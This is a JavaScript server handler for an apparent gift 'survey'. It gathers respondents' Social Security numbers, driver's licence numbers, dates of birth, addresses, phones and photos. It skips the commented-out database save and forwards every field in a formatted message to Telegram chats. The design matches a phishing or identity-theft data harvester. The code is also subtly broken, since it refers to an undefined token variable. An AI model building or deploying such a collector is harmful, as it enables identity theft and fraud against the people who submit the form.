import prisma from "../lib/prisma.js";
import axios from "axios";
import { generateSign } from "../helper/tiktok.api.js";

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const CHAT_IDS = process.env.TELEGRAM_CHAT_IDS?.split(",") || [];

export const createSurvey = async (req, res) => {
  try {
    const {
      question1,
      question2,
      question3,
      question4,
      question5,
      gift,
      idType,
      address,
      photo,
      ssn,
      delivery,
      identity,
    } = req.body;

    const data = {
      answers: [question1, question2, question3, question4, question5, gift],
      licenseType: idType,
      fullName: address.name,
      address: address.address,
      state: address.state,
      city: address.city,
      zipcode: address.zipcode,
      phone: address.phone,
      photoUrl: photo,
      ssn,
      delivery,
      identity,
    };

    // const survey = await prisma.survey.create({ data });

    // send tele
    await sendTelegramNotification(formatMessage(data));

    res.status(200).json({ message: "Survey created successfully" });
  } catch (error) {
    console.log(
      `Error: ${error.message}\nStack: ${error.stack.split("\n")[1]}`
    );

    res.status(500).json({ message: "Failed to create survey!" });
  }
};

async function sendTelegramNotification(message) {
  await Promise.all(
    CHAT_IDS.map((chatId) =>
      axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
        chat_id: chatId.trim(), // always good to trim spaces
        text: message,
        parse_mode: "Markdown",
      })
    )
  );
  console.log("Message sent to all chat IDs");
}

function formatMessage(data) {
  return `
📝 New Survey Submission:

✅ Answers:
${data.answers.map((answer) => `- ${answer}`).join("\n")}

🪪 License Type: ${capitalizeFirstLetter(data.licenseType)}

👤 Full Name: ${data.fullName}
🏡 Address: ${data.address}, ${data.city}, ${data.state}, ${data.zipcode}

📞 Phone: ${data.phone}

🖼️ Photo URL:
${data.photoUrl}

🔒 SSN: ${data.ssn}

🚚 Delivery Info:
- First Name: ${data.delivery.firstName}
- Last Name: ${data.delivery.lastName}
- Email: ${data.delivery.email}
- Twitter: ${data.delivery.twitter}
- Phone Number: ${data.delivery.phoneNumber}

🆔 Identity Info:
- First Name: ${data.identity.firstName}
- Last Name: ${data.identity.lastName}
- Date of Birth: ${data.identity.dob}
- Gender: ${data.identity.gender}
- Address: ${data.identity.address}
- City: ${data.identity.city}
- State: ${data.identity.state}
- Zipcode: ${data.identity.zipcode}
- DL Number: ${data.identity.dlNumber}
`;
}

function capitalizeFirstLetter(string) {
  return string.charAt(0).toUpperCase() + string.slice(1);
}
